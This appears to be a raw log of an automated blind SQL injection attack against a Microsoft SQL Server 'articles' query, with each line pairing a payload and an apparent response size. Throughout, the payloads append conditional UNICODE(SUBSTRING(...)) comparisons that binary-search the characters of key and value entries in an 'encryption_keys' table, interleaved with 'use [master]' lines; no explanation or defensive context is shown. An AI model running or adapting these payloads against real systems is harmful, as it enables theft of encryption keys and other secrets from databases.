+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>120	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>116	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>114	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>115	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>96	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>112	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>120	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>116	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>114	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>115	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>96	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>112	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>120	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>116	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>118	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>119	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>96	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>112	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>104	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>108	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>110	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>111	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>96	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>112	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>120	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>116	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>114	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>113	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>96	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>112	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>104	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>100	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>98	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>99	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>96	406
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>48	406
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>1	405
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>64	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>96	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>80	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>72	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>68	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>66	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>67	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>64	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>96	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>80	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>88	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>84	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>82	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>83	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>64	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>96	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>80	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>72	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>68	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>70	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>69	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>64	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>96	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>112	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>120	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>124	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>122	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>123	409
+	138
+use [master]	86
+	165
